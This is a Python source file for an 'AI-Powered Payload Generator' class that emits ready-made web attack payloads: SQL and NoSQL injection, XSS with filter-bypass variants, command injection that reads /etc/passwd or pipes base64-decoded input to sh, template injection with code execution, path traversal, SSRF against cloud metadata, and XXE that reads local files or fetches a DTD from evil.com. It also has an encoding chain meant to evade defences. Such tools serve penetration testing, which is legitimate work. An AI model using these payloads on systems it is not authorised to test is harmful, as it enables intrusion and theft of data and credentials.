"""
AI-Powered Payload Generator
Creates intelligent, context-aware payloads for vulnerability testing
"""

import random
import string
import hashlib
from typing import List, Dict, Any, Optional
import json
import re

class AIPayloadGenerator:
    """Generates intelligent payloads based on target context"""
    
    def __init__(self, target_info: Dict[str, Any] = None):
        self.target_info = target_info or {}
        self.payloads = {
            'sqli': self._generate_sqli_payloads,
            'xss': self._generate_xss_payloads,
            'nosqli': self._generate_nosqli_payloads,
            'command_injection': self._generate_command_injection,
            'template_injection': self._generate_ssti_payloads,
            'path_traversal': self._generate_path_traversal,
            'open_redirect': self._generate_open_redirect,
            'ssrf': self._generate_ssrf_payloads,
            'xxe': self._generate_xxe_payloads,
            'custom': self._generate_custom_payloads
        }
    
    def generate_payloads(self, vuln_type: str, count: int = 10, 
                          context: Dict[str, Any] = None) -> List[str]:
        """Generate AI-powered payloads for specific vulnerability type"""
        context = context or {}
        
        if vuln_type in self.payloads:
            return self.payloads[vuln_type](count, context)
        else:
            return self._generate_custom_payloads(count, context)
    
    def _generate_sqli_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate intelligent SQL injection payloads"""
        base_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR 1=1 --",
            "' UNION SELECT NULL--",
            "' WAITFOR DELAY '0:0:5'--",
            "admin'--",
            "admin' #",
            "' OR 1=1 in (SELECT * FROM users) --"
        ]
        
        # AI-enhanced payloads
        ai_payloads = []
        
        # Context-aware mutations
        if context.get('database'):
            db = context['database'].lower()
            if 'mysql' in db:
                ai_payloads.extend([
                    "' UNION SELECT 1,2,3,4--",
                    "' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables--"
                ])
            elif 'postgresql' in db:
                ai_payloads.extend([
                    "'; SELECT pg_sleep(5)--",
                    "' UNION SELECT NULL,table_name FROM information_schema.tables--"
                ])
        
        # Obfuscation techniques
        for payload in base_payloads[:count]:
            # Case variation
            ai_payloads.append(payload.upper())
            # Comment obfuscation
            ai_payloads.append(payload.replace(" ", "/**/"))
            # URL encoding
            ai_payloads.append(''.join(['%' + hex(ord(c))[2:] for c in payload]))
        
        return list(set(ai_payloads))[:count]
    
    def _generate_xss_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate intelligent XSS payloads with evasion techniques"""
        base_vectors = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<iframe srcdoc='<script>alert(1)</script>'>"
        ]
        
        ai_payloads = []
        
        # WAF bypass techniques
        waf_bypass = [
            "<scr<script>ipt>alert(1)</scr<script>ipt>",
            "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
            "javascripT:alert(1)",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
        ]
        
        # Context-aware payloads
        if context.get('input_type') == 'attribute':
            ai_payloads.extend([
                "\" onmouseover=alert(1) \"",
                "' onfocus=alert(1) '",
                "javascript:alert(1)"
            ])
        elif context.get('input_type') == 'textarea':
            ai_payloads.extend([
                "</textarea><script>alert(1)</script>",
                "</Textarea><script>alert(1)</script>"
            ])
        
        # Combine and deduplicate
        all_payloads = base_vectors + waf_bypass + ai_payloads
        return list(set(all_payloads))[:count]
    
    def _generate_command_injection(self, count: int, context: Dict) -> List[str]:
        """Generate command injection payloads"""
        base_commands = [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd"
        ]
        
        # OS-specific payloads
        os_payloads = []
        if context.get('os') == 'windows':
            os_payloads = [
                "& dir",
                "| dir",
                "& type C:\\windows\\win.ini",
                "| type C:\\windows\\win.ini"
            ]
        else:
            os_payloads = [
                "; id",
                "| id",
                "; uname -a",
                "| uname -a"
            ]
        
        # Obfuscated payloads
        obfuscated = []
        for cmd in base_commands[:3]:
            # Environment variable obfuscation
            obfuscated.append(cmd.replace("ls", "${PATH:0:1}s"))
            # Base64 encoded
            obfuscated.append(f"; echo {self._b64encode('ls')} | base64 -d | sh")
        
        all_payloads = base_commands + os_payloads + obfuscated
        return list(set(all_payloads))[:count]
    
    def _generate_nosqli_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate NoSQL injection payloads"""
        payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": "^.*"}',
            '{"$where": "function() { return true }"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"$or": [{"username": "admin"}, {"password": {"$regex": "^.*"}}]}'
        ]
        
        # MongoDB-specific
        if context.get('db_type') == 'mongodb':
            payloads.extend([
                '{"$ne": null, "$gt": ""}',
                '{"$regex": "^admin.*"}',
                '{"$where": "this.password.length > 0"}'
            ])
        
        return payloads[:count]
    
    def _generate_ssti_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate Server-Side Template Injection payloads"""
        engine_payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            'twig': [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                "{{_self.env.getFilter('cat /etc/passwd')}}"
            ],
            'freemarker': [
                "${7*7}",
                "${7*'7'}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('ls')}"
            ]
        }
        
        engine = context.get('template_engine', 'jinja2')
        return engine_payloads.get(engine, engine_payloads['jinja2'])[:count]
    
    def _generate_path_traversal(self, count: int, context: Dict) -> List[str]:
        """Generate path traversal payloads"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2fetc%2fpasswd",
            "..;/etc/passwd",
            "....//....//....//etc/passwd",
            "..\\/..\\/..\\/etc/passwd"
        ]
        
        if context.get('os') == 'windows':
            payloads = [
                "..\\..\\..\\windows\\win.ini",
                "....\\\\....\\\\....\\\\windows\\\\win.ini",
                "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
            ]
        
        return payloads[:count]
    
    def _generate_open_redirect(self, count: int, context: Dict) -> List[str]:
        """Generate open redirect payloads"""
        evil_domains = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com@google.com",
            "https://google.com.evil.com",
            "/\\evil.com",
            "javascript:alert(1)"
        ]
        
        return evil_domains[:count]
    
    def _generate_ssrf_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate SSRF payloads"""
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080",
            "http://localhost:22",
            "file:///etc/passwd",
            "gopher://localhost:8080/_GET / HTTP/1.0",
            "dict://localhost:11211/",
            "ftp://ftp.example.com:21/"
        ]
        
        return payloads[:count]
    
    def _generate_xxe_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate XXE payloads"""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><root/>'
        ]
        
        return payloads[:count]
    
    def _generate_custom_payloads(self, count: int, context: Dict) -> List[str]:
        """Generate custom payloads based on context"""
        custom = []
        
        # Fuzzing payloads
        fuzz_chars = ['"', "'", "<", ">", "(", ")", ";", "|", "&", "$", "`"]
        for _ in range(min(count, 5)):
            payload = ''.join(random.choice(fuzz_chars) * random.randint(2, 10))
            custom.append(payload)
        
        # Random strings
        for _ in range(min(count, 5)):
            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
            custom.append(payload)
        
        return custom[:count]
    
    def _b64encode(self, s: str) -> str:
        """Base64 encode a string"""
        import base64
        return base64.b64encode(s.encode()).decode()
    
    def generate_payload_chain(self, base_payload: str, techniques: List[str]) -> List[str]:
        """Apply multiple evasion techniques to a payload"""
        variants = [base_payload]
        
        for technique in techniques:
            new_variants = []
            for p in variants:
                if technique == 'url_encode':
                    new_variants.append(''.join(['%' + hex(ord(c))[2:] for c in p]))
                elif technique == 'double_url_encode':
                    encoded = ''.join(['%' + hex(ord(c))[2:] for c in p])
                    new_variants.append(''.join(['%25' + hex(ord(c))[2:] for c in encoded]))
                elif technique == 'case_variation':
                    new_variants.append(p.upper())
                    new_variants.append(p.lower())
                    new_variants.append(p.capitalize())
                elif technique == 'comment_insert':
                    new_variants.append(p.replace(" ", "/**/"))
                elif technique == 'hex_encoding':
                    new_variants.append('0x' + ''.join([hex(ord(c))[2:] for c in p]))
                elif technique == 'base64':
                    new_variants.append(f"${{base64_decode({self._b64encode(p)})}}")
            variants.extend(new_variants)
        
        return list(set(variants))
